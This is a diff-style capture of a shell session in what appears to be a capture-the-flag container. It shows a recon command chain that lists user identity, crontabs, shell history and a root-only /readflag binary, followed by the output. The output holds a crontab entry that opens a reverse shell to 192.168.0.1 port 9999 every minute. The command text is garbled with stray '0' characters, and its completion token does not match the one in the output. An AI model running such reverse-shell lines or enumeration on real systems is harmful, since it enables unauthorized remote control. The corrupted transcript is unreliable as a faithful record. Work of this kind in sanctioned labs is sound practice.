@@ -1,0 +1,27 @@
+0whoam0i; id; hostname;0 echo '=== 0crontab -l 0==='; cron0tab -l 2>&10; echo '=== 0/etc/cront0abs ==='; ls0 -la /etc/0crontabs 2>0&1; echo '0=== histor0y ==='; ls 0-la /home/0ctf/.ash_h0istory 2>&10; e
+cho '=0== readfl0ag/flag =0=='; ls -0la /readf0lag /fla0g 2>&1; e0cho '=== 0home ===0'; ls -la0 /home/c0tf 2>&1; 0echo CMD0DONE_addd1085caab14e0dea982c520b7294f0750
+0ctf
+0uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
+03f41e1bc9978
+0=== crontab -l ===
+0* * * * * /bin/bash -i >& /dev/tcp/192.168.0.1/9999 0>&1
+
+0=== /etc/crontabs ===
+0total 8
+0drwxr-xr-x 1 root root  17 Dec 26  2023 .
+drwxr-xr-x 1 root root  57 Apr 14 22:31 ..
+-rw-r--r-- 1 root root  58 Dec 26  2023 ctf
+-rw------- 1 root root 283 Sep 16  2021 root
+0=== history ===
+0-rw------- 1 ctf ctf 332 Apr 14 22:33 /home/ctf/.ash_history
+0=== readflag/flag ===
+0ls: cannot access '/flag': No such file or directory
+0-r-x------ 1 root root 18296 Dec 26  2023 /readflag
+0=== home ===
+0total 8
+0drwxr-xr-x 1 ctf  ctf   43 Apr 14 22:33 .
+drwxr-xr-x 1 root root  17 Dec 26  2023 ..
+-rw------- 1 ctf  ctf  332 Apr 14 22:33 .ash_history
+-rw-r--r-- 1 ctf  ctf   64 Dec 26  2023 README.md
+0CMDDONE_addd185caab14edea982c52b7294f075
+
